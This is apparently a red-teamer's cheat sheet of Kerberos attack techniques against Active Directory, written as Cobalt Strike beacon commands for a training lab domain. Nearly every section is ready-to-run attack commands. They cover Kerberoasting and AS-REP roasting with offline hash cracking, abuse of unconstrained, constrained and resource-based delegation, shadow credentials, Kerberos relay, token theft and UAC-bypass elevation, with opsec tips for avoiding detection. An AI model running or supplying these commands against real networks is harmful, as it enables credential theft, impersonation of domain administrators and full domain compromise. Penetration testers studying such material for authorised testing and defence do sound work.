# Kerberos notes

**Kerberoasting**

Request the TGS for services running under the context of domain accounts to crack offline

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /simple /nowrap
```

--format=krb5tgs --wordlist=wordlist hashes for john or -a 0 -m 13100 hashes wordlist 

```
john --format=krb5tgs --wordlist=wordlist mssql_svc
hashcat -a 0 -m 13100 hash wordlist
```

opsec consideration, query users first then roast them
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:<User> /nowrap
```

**ASREP Roast**

Users with no kerberos pre-auth can be requested and their can be cracked offline

This will start with a query then a roast
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:<User> /nowrap
```

crack --format=krb5asrep --wordlist=wordlist squid_svc for john or -a 0 -m 18200 squid_svc wordlist for hashcat
```
john --format=krb5asrep --wordlist=wordlist hash
hashcat -a 0 -m 18200 hash wordlist
```

**Unconstrained Delegation**

A machine or user is allowed to act on the behalf of another with no restrictions

search for all computers with this
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
```

an example exploit of it being used to steal another users session by abusing a machine other users interact with
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:<user> /password:FakePass /ticket:doIFwj[...]MuSU8=
steal_token 1540
```

stealing TGT's by forcing them to auth to this machine we popped
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe <target> <attacker owned listener>
```

**Constrained Delegation**

Similar to unconstrained but the delegation attempts to restrict services the server can act on behalf of a user

To find computers configured for constrained delegation, search for those whose  msds-allowedtodelegateto attribute is not empty.
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
```

To perform we need the TGT of the principal trusted for delegation, use Rubeus for this
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
```

Now use S4U to obtain a TGS for CIFS for the DC for a domain admin, then run another S4UProxy ticket and pass it into a new logon session, and of course steal it's token
Make sure to always use the FQDN afterwards, or you will get errors
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:<domain admin wanted to impersonate> /msdsspn:cifs/<DC domain name> /user:<current user with constrained delegation> /ticket:doIFLD[...snip...]MuSU8= /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:<domain admin wanted to impersonate> /password:FakePass /ticket:doIGaD[...]ljLmlv
steal_token 5540
```

**Alternate Service Name**

The SPN information in the ticket is not encrypted and can be changed arbitrarily.  We can request a service ticket for a service, such as CIFS, but then modify the SPN to something different, such as LDAP, and the target service will accept it 
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:<domain admin wanted to impersonate> /msdsspn:cifs/<DC domain name> /altservice:ldap /user:<current user> /ticket:doIFpD[...]MuSU8= /nowrap
```

**S4U2Self Abuse**

Rubeus being used to abuse the S4U2Self to obtain a usable TGS as a local admin user using the /self flag  
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:<user> /self /altservice:cifs/<dc domain name> /user:<delegation user> /ticket:doIFuj[...]lDLklP /nowrap
steal_token <PID>
```

**Resource-Based Constrained Delegation**

This query will obtain every domain computer and read their ACL, filtering on the interesting rights
- WriteProperty
- GenericWrite
- GenericAll
- WriteDacl
```
powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
```

The common way of obtaining a principal with an SPN is to use a computer account. Steps:
1. get the SID
2. use this inside an SDDL to create a security descriptor.  The content of msDS-AllowedToActOnBehalfOfOtherIdentity must be in raw binary format.
3. Now use Set-DomainObjects in a one liner in CS to execute
4. use the computer account to perform a S4U impersonation with Rubeus
5. then pass the ticket

```
powershell Get-DomainComputer -Identity wkstn-2 -Properties objectSid
$rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID>)"
$rsdb = New-Object byte[] ($rsd.BinaryLength)
$rsd.GetBinaryForm($rsdb, 0)
powershell $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID>)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "<DC>" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
powershell Get-DomainComputer -Identity "<DC>" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIFuD[...]5JTw== /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD[...]MuaW8=
steal_token <PID>
```

If you did not have local admin access to a computer already, you can resort to creating your own computer object
Tools used: [StandIn](https://github.com/FuzzySecurity/StandIn)
```
CS:
powershell Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota
execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make
On Attacker machine:
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io
CS:
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:<aes key> /nowrap
```

**Shadow Credentials**

Raw key data can be used rather than a certificate in a Key Trust model, this stores a client key on their own domain object in an attribute called msDS-KeyCredentialLink. If you can write to this attribute on a user or computer object you can obtain a TGT for that principal. A DACL-style abuse as with RBCD.
Tools: [Whisker](https://github.com/eladshamir/Whisker)
Steps:
1. use whisker to identify any keys on the present target
2. add a new key pair
3. ask for TGT using rubeus
4. can remove with whiskers clear command if needed

```
execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc-2$
execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe add /target:dc-2$
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:dc-2$ /certificate:MIIJuA[...snip...]ICB9A= /password:"<password>" /nowrap
execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc-2$
```

**Kerberos Relay Attacks**

Tools: [KrbRelay](https://github.com/cube0x0/KrbRelay), automated tool: [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)

krbrelay is too large on default so increase beacon task size
```
set tasks_max_size "2097152";
```

### RBCD with kerberos relay

Tools: [SCMUACBypass](https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82)
steps:
1. add your own computer object to the domain and get it's SID
2. find suitable port for OXID resolver to circumvent a check in the RPCSS, can use CheckPort.exe
3. Run KerbRelay  
    -spn is the target service to relay to.
    -clsid represents RPC_C_IMP_LEVEL_IMPERSONATE.
    -rbcd is the SID of the fake computer account.
    -port is the port returned by CheckPort.
5. verify that a new entry in the machines msDS-AllowedToActOnBehalfOfOtherIdentity
6. now request TGT and perform an S4U to obtain a usable service ticket
7. use SCMUACBypass to elevate

```
execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make
powershell Get-DomainComputer -Identity EvilComputer -Properties objectsid
execute-assembly C:\Tools\KrbRelay\CheckPort\bin\Release\CheckPort.exe
execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd <machine SID> -port 10
powershell Get-DomainComputer -Identity wkstn-2 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:1DE19DC9065CFB29D6F3E034465C56D1AEC3693DB248F04335A98E129281177A /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:EvilComputer$ /impersonateuser:Administrator /msdsspn:host/wkstn-2 /ticket:doIF8j[...snip...]MuaW8= /ptt
elevate svc-exe-krb tcp-local
```

### Shadow creds with kerberos relay

The advantage of using shadow credentials over RBCD is that we don't need to add a fake computer to the domain.  
1. First, verify that your machine account has nothing in its msDS-KeyCredentialLink attribute.
2. run kerbreay with -shadowcred
3. get aes ticket using rubeus
4. s4u2self to obtain a HOST service ticket
5. elevate


```
execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:wkstn-2$
execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -shadowcred -port 10
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-2$ /certificate:MIIJyA[...snip...]QCAgfQ /password:"06ce8e51-a71a-4e0c-b8a3-992851ede95f" /enctype:aes256 /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:host/wkstn-2 /user:wkstn-2$ /ticket:doIGkD[...snip...]5pbw== /ptt
elevate svc-exe-krb tcp-local
```
